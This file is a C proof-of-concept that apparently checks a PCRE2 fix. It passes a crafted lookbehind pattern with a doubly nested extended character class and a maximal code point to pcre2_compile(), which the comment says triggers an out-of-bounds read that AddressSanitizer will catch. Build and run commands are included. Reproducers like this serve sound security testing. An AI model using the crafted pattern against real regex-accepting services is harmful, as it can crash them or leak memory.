/* Residual memory-safety PoC for the ECLASS/lookbehind nesting fix.
 *
 * Compiling a lookbehind whose character class contains a doubly-nested
 * extended class (PCRE2_ALT_EXTENDED_CLASS), where the innermost nested
 * class starts with a very large code point, makes pcre2_compile() walk
 * far past the end of its internally allocated parsed-pattern buffer while
 * computing the lookbehind's fixed length. Build and run under
 * AddressSanitizer to observe the out-of-bounds read.
 *
 * Build (from a configured build directory containing libpcre2-8.a and the
 * generated pcre2.h, e.g. /work/build):
 *   cc -fsanitize=address -g -I. -I../src pocs/residual.c libpcre2-8.a -o residual
 * Run:
 *   ./residual
 */

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
  PCRE2_UCHAR pattern[] = "(?<=[A[B[\\x{10FFFF}C]D]E])";
  int errorcode;
  PCRE2_SIZE erroroffset;

  pcre2_code *re = pcre2_compile(pattern, strlen((char *)pattern),
    PCRE2_ALT_EXTENDED_CLASS | PCRE2_UTF, &errorcode, &erroroffset, NULL);

  if (re == NULL)
    {
    PCRE2_UCHAR buf[256];
    pcre2_get_error_message(errorcode, buf, sizeof(buf)/sizeof(PCRE2_UCHAR));
    printf("compile failed at %lu: %s\n", (unsigned long)erroroffset, buf);
    return 1;
    }

  printf("compiled ok (unexpected on a safe build)\n");
  pcre2_code_free(re);
  return 0;
}
